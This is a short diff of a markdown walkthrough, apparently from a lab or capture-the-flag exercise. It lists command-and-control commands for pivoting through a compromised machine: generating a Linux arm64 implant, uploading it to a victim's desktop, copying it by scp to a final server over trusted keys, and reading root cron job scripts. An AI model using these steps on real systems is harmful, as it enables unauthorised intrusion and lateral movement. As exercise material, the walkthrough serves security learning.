@@ -11,6 +11,6 @@ View sessions: `sessions`\
 Use the Implant: `use [session number]`\
 Create a pivot through that implant: `pivots tcp --lport [Pivot Port]`\
 Generate an implant for that pivot: `generate --os linux --arch arm64 --tcp-pivot [IP Address of Intermediate Server:[Pivot Port] --name [Pivot Implant Name]`\
-Upload that implant to his desktop with the upload command (More blendy than another SCP): `upload ./[Pivot Implant Name in Local Directory] ./[Pivot Implant Name in Remote Directory]` 
+Upload that implant to his desktop with the upload command (More blendy than another SCP): `upload ./[Pivot Implant Name in Local Directory] ./[Pivot Implant Name in Remote Directory]`\
 Use our implant to scp it over to the Final Server: `execute -o scp [Pivot Implant Name] aeverwooddesktop@[IP of Final Server]:/home/aeverwooddesktop/Documents` (His desktop is trusted because of the scp keys so there is no need for a password)`\
 Naviagte to the tmp directory and see what is in one of the root_cron_job files: `execute -o cat root_cron_job_1.sh`\
